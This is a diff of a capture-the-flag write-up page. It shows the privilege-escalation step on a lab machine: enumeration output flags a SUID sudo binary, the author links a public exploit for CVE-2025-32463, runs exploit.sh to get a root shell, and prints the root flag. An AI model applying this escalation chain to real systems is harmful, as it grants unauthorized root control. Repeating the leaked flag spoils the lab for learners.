+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                    
+strace Not Found                                                                                                   
+-rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4                                                           
+-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable</code></pre></div>
+      <p>Through research, I found <strong>CVE-2025-32463</strong>, a local privilege escalation vulnerability affecting this system. The exploit is available at: <a href="https://github.com/kh4sh3i/CVE-2025-32463." target="_blank" rel="noopener">https://github.com/kh4sh3i/CVE-2025-32463.</a></p>
+      <p>I download the exploit script to the target, set execute permissions, and run it. The exploit successfully escalates privileges to root.</p>
       <div class="code-block"><pre><code>ike@expressway:~$ chmod +x exploit.sh
 ike@expressway:~$ ./exploit.sh 
 woot!
 root@expressway:/# id
 uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)</code></pre></div>
-      <p>Here below you can find the root flag.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">a709bf0ca4b87d02693fcf9d409692d3</code>
-</div>
+      <p>With root privileges now obtained, I navigate to <code>/root/root.txt</code> and read the final flag. This completes the privilege escalation chain from initial foothold to full system compromise.</p>
       <div class="code-block"><pre><code>root@expressway:/root# cat root.txt
 a709bf0ca4b87d02693fcf9d409692d3</code></pre></div>
-      <h4 class="writeup-step-title">Rooted</h4>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250922122525.png" alt="Pasted image 20250922122525.png" loading="lazy" /><span class="img-caption">Pasted image 20250922122525.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">a709bf0ca4b87d02693fcf9d409692d3</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250922122525.png" alt="Machine rooted successfully" loading="lazy" /><span class="img-caption">Machine rooted successfully</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
